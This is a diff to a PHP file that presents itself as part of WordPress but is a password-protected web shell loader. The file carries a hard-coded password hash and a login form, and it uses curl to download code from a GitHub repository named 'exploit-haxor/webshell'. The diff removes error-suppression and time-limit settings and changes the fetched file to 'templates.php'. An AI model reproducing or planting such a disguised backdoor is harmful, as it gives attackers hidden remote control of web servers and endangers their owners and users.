@@ -18,12 +18,7 @@
  *
  * @package WordPress
  */
-ignore_user_abort(true);
-ini_set('memory_limit', '-1');
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', 0);
-ini_set('max_execution_time', 5000);
+
 // are u challange me :v
 $hashed_password = '$2y$10$QSGYu2pSK8RtNYa4F/2DEuO5/kiaBnO9IBch7B4QSnA7z8zoZQarG'; // Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik default password gud boy
 // Fungsi untuk menampilkan form login
@@ -53,7 +48,7 @@ $head = '<head><meta name="viewport" content="width=device-width, initial-scale=
 <style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
 </style>
 </head>';
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin";
+$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/templates.php";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
